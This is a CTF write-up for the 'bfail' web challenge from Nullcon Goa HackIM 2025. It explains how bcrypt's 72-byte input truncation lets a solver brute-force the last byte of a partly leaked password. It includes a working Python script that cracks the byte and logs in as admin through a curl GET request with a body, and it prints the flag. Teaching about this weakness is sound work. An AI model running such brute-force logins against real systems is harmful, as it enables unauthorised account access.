---
title: "bfail - Nullcon Goa HackIM 2025 CTF"
category: "web"
type: "writeup"
tags: ["web", "subprocess", "bfail", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "In this challenge, we have access to the source code, which includes the following comment:"
source:
  name: "CTFtime writeup #40026"
  url: "https://ctftime.org/writeup/40026"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "bfail"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** bfail
- **Author team:** 🐧‎
- **CTFtime:** <https://ctftime.org/writeup/40026>

---
In this challenge, we have access to the source code, which includes the following comment: 

```txt  
# This is super strong! The password was generated quite securely. Here are the first 70 bytes, since you won't be able to brute-force the rest anyway...  
# >>> strongpw = bcrypt.hashpw(os.urandom(128),bcrypt.gensalt())  
# >>> strongpw[:71]  
# b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'  
```

The password was created using `bcrypt.hashpw(os.urandom(128), bcrypt.gensalt())`, and we are given the first 71 bytes. 

However, bcrypt has a well-known limitation—it truncates input to 72 bytes, meaning anything beyond that is ignored. Since we already have the first 71 bytes, we only need to determine the last byte, which can be found through brute force. 

```python  
[...]  
@app.route('/', methods=["GET"])  
def index():  
username = request.form.get("username", None)  
password = request.form.get("password", None)  
[...]  
```

Additionally, another aspect of the challenge is that the login route only supports GET requests. This means we cannot send a POST request to authenticate, but we can include credentials in the GET request body to log in as an admin. 

The script below brute-forces the last byte of the password, checks if it matches the admin password hash, and sends a request to the server: 

```python  
import bcrypt, subprocess  
import urllib.parse  
password = b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'

ADMIN_PW_HASH = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'  
host = "52.59.124.14:5013"  
for j in range(0xaa, 256):  
p = password+bytes([j])  
if bcrypt.checkpw(p, ADMIN_PW_HASH):  
encoded_password = urllib.parse.quote(p)  
print("GOOD", p.hex())  
subprocess.run(f"""curl -X GET "http://{host}/" --data-raw "username=admin&password={encoded_password}\"""", shell=True)  
break  
else:  
print("Done")  
```

The flag for this challenge is:   
**`ENO{BCRYPT_FAILS_TO_B_COOL_IF_THE_PW_IS_TOO_LONG}`**
